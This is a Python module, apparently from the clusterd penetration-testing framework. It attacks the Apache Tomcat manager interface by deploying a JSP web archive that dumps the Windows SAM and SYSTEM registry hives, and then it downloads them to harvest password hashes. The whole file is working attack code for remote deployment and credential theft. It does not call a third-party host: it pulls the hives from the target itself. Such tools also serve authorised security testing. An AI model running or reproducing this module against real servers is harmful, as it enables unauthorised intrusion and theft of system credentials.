from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from log import LOG
from auxiliary import Auxiliary
from os import getuid
from time import sleep
import deployer
import utility


class Auxiliary:

    def download_file(self, url, fname):
        local_filename = fname
        r = utility.requests_get(url, stream=True)
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
                    f.flush()
        return local_filename

    def __init__(self):
        self.name = 'Obtain Sam and System Registries'
        self.versions = ['3.0','3.2','4.0','4.2','5.0','5.1','6.0','6.1']
        self.show = True
        self.flag = 'tc-getSAM'

    def check(self, fingerprint):
        if fingerprint.title in [TINTERFACES.MAN]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """This module will use a JSP file that checks if JBoss is admin. If it is
        the plugin will activate a "reg save HKLM\SAM *jbosspath*\getSAM\sam.txt"
        as well as a "reg save HKLM\System *jbosspath*\getSAM\system.txt". Once
        completed it will then go and grab those files with a get request.

        -sk1tt1sh
        """

        if getuid() > 0:
            utility.Msg("Root prives required for this module.", LOG.ERROR)
            return

        fingerengine.options.deploy = "./src/lib/getSAM.war"
        deployer.run(fingerengine)
        sleep(5)

        url = "http://{0}:{1}/getSAM/getSAM.jsp".format(
            fingerengine.options.ip, fingerprint.port)

        utility.Msg("Checking if successfully deployed and executed...")
        response = utility.requests_get(url)

        if response.status_code == 401:
            utility.Msg("Host requires auth...")

        if response.status_code == 200:
            utility.Msg("Deploy worked. Getting the files...")
            filenames = response.text
            if len(filenames) != 0:
                samfile = filenames.split("<")[0]
                samfile = samfile.replace(" ", "")
                samfile = samfile.replace("\n", "")
                samfile = samfile.rstrip()
                systemf = filenames.split(">")[1]
                systemf = systemf.replace("\n", "")
                systemf = systemf.replace(" ", "")
                systemf = systemf.rstrip()

                utility.Msg("Data in response, snagging hashes.", LOG.SUCCESS)

                urlsam = "http://{0}:{1}/getSAM/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, samfile)
                self.download_file(urlsam, "SAM")
                utility.Msg("Downloaded SAM into clustered directory.")

                urlsys = "http://{0}:{1}/getSAM/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, systemf)
                self.download_file(urlsys, "System")
                utility.Msg("Downloaded System into clusterd directory.")
        fingerengine.options.deploy = None